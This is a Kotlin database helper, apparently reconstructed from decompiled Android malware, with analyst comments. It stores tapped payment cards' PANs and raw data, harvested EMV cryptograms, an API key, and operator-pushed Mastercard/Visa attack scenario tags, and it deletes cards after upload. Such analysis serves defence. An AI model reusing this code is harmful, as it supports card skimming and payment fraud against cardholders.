// orig: B2/a.java   (R8-renamed from the operator's Kotlin class)
//
// On-device cache. Stores tapped cards, harvested ARQCs, and the operator's
// scenario list ("cves"). Schema version 8 — anything older is wiped on upgrade.

package xyz.happify.ckemv.db

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import xyz.happify.ckemv.model.CardRecord
import xyz.happify.ckemv.model.CveConfig
import xyz.happify.ckemv.model.HarvestedTx

class HarvestDatabaseHelper(context: Context) :
    SQLiteOpenHelper(context, DB_NAME, null, DB_VERSION) {

    companion object {
        const val DB_NAME    = "CkemvHarvest.db"
        const val DB_VERSION = 8
    }

    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL("""
            CREATE TABLE cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pan TEXT,
                aid TEXT,
                network TEXT,
                raw_data TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        db.execSQL("""
            CREATE TABLE transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                card_id INTEGER,
                atc TEXT,
                arqc TEXT,
                time_ms REAL,
                params TEXT,
                cve_id INTEGER,
                FOREIGN KEY(card_id) REFERENCES cards(id)
            )
        """)
        db.execSQL("""
            CREATE TABLE stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                total_scans INTEGER DEFAULT 0,
                api_key TEXT
            )
        """)
        db.execSQL("""
            CREATE TABLE cves (
                id INTEGER PRIMARY KEY,
                name TEXT,
                amount INTEGER,
                mc_tags TEXT,
                visa_tags TEXT
            )
        """)
        db.execSQL("INSERT INTO stats (total_scans, api_key) VALUES (0, NULL)")
    }

    // Upgrades < 8 wipe everything. Note `terminals` — vestigial table from
    // an earlier build of this family; the operator no longer collects
    // acquirer/terminal metadata but still drops the table on upgrade.
    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        if (oldVersion < 8) {
            db.execSQL("DROP TABLE IF EXISTS transactions")
            db.execSQL("DROP TABLE IF EXISTS cards")
            db.execSQL("DROP TABLE IF EXISTS stats")
            db.execSQL("DROP TABLE IF EXISTS terminals")
            db.execSQL("DROP TABLE IF EXISTS cves")
            onCreate(db)
        }
    }

    /** Read the single-row api_key. Null if it hasn't been provisioned yet. */
    fun getApiKey(): String? {
        val cursor = readableDatabase.rawQuery(
            "SELECT api_key FROM stats WHERE id = 1", null)
        val key = if (cursor.moveToFirst()) cursor.getString(0) else null
        cursor.close()
        return key
    }

    /**
     * Insert one tapped card + all its harvested transactions.
     * No explicit BEGIN/COMMIT — relies on SQLite autocommit. A crash mid-loop
     * leaves orphan rows but the operator doesn't care for harvesting purposes.
     * @return new cards.id, or -1 on failure.
     */
    fun insertCard(card: CardRecord): Long {
        val db = writableDatabase
        val cardValues = ContentValues().apply {
            put("pan",      card.pan)
            put("aid",      card.aid)
            put("network",  card.network)
            put("raw_data", card.rawData)
        }
        val cardId = db.insert("cards", null, cardValues)
        if (cardId != -1L) {
            for (tx in card.txs) {
                val txValues = ContentValues().apply {
                    put("card_id", cardId)
                    put("atc",     tx.atc)
                    put("arqc",    tx.arqc)
                    put("time_ms", tx.timeMs)
                    put("params",  tx.params)
                    put("cve_id",  tx.cve_id)
                }
                db.insert("transactions", null, txValues)
            }
        }
        return cardId
    }

    /** Delete a card row plus its transaction rows. Called after a successful upload. */
    fun deleteCard(cardId: Long) {
        val db = writableDatabase
        db.delete("transactions", "card_id = ?", arrayOf(cardId.toString()))
        db.delete("cards",        "id = ?",      arrayOf(cardId.toString()))
    }

    /**
     * Wholesale-replace the cves table. This is how the operator rotates
     * playbooks — push a fresh list via /me and the device drops every
     * cached scenario before re-seeding.
     */
    fun replaceAllCves(cves: List<CveConfig>) {
        val db   = writableDatabase
        val gson = Gson()
        db.beginTransaction()
        try {
            db.delete("cves", null, null)
            for (cve in cves) {
                val v = ContentValues().apply {
                    put("id",         cve.id)
                    put("name",       cve.name)
                    put("amount",     cve.amount)
                    put("mc_tags",    gson.toJson(cve.mastercard_tags))
                    put("visa_tags",  gson.toJson(cve.visa_tags))
                }
                db.insert("cves", null, v)
            }
            db.setTransactionSuccessful()
        } finally {
            db.endTransaction()
        }
    }

    /**
     * Read every cached scenario. mc_tags/visa_tags are deserialised back
     * from JSON; missing/null columns degrade to empty maps so the NFC
     * loop never has to null-check.
     */
    fun getAllCves(): ArrayList<CveConfig> {
        val out  = ArrayList<CveConfig>()
        val gson = Gson()
        val mapType = object : TypeToken<Map<String, String>>() {}.type
        val cursor = readableDatabase.rawQuery("SELECT * FROM cves", null)
        if (cursor.moveToFirst()) {
            do {
                val id     = cursor.getInt(cursor.getColumnIndexOrThrow("id"))
                val name   = cursor.getString(cursor.getColumnIndexOrThrow("name"))
                val amount = cursor.getInt(cursor.getColumnIndexOrThrow("amount"))

                val mcIdx  = cursor.getColumnIndexOrThrow("mc_tags")
                val visIdx = cursor.getColumnIndexOrThrow("visa_tags")
                val mcJson    = if (cursor.isNull(mcIdx))  "{}" else cursor.getString(mcIdx)
                val visaJson  = if (cursor.isNull(visIdx)) "{}" else cursor.getString(visIdx)

                val mc:   Map<String, String> = gson.fromJson(mcJson,   mapType) ?: emptyMap()
                val visa: Map<String, String> = gson.fromJson(visaJson, mapType) ?: emptyMap()

                out.add(CveConfig(id, name, amount, mc, visa))
            } while (cursor.moveToNext())
        }
        cursor.close()
        return out
    }
}
